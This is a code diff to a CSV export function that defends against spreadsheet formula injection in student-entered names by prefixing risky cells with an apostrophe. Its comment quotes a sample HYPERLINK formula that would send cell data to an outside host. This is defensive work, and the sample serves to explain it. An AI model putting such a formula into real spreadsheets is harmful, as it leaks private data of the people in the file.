@@ -204,10 +204,27 @@ function totalsFor(rows: LedgerRow[]): LedgerTotals {
   };
 }
 
-/** Escapes one CSV field — quotes doubled, the whole thing quoted. */
+/**
+ * Escapes one CSV field — quotes doubled, the whole thing quoted, and text
+ * that a spreadsheet would read as a formula defused with a leading
+ * apostrophe.
+ *
+ * Students type their own names. Excel, Google Sheets and LibreOffice all
+ * treat a cell beginning with `=`, `+`, `-` or `@` as a formula no matter how
+ * carefully it is quoted, so a student calling themselves
+ * `=HYPERLINK("http://…"&A1,"Click")` is writing code that runs on the machine
+ * of whoever opens the ledger — which is the teacher's own laptop, holding
+ * every student's phone number. The apostrophe is not displayed by any of the
+ * three; it only says "this cell is text".
+ *
+ * Numbers are left alone: a number cannot be a formula, and an apostrophe in
+ * front of one would stop the amounts column adding up.
+ */
 function csvField(value: string | number): string {
+  if (typeof value === "number") return `"${value}"`;
   const text = String(value ?? "");
-  return `"${text.replace(/"/g, '""')}"`;
+  const defused = /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
+  return `"${defused.replace(/"/g, '""')}"`;
 }
 
 /**
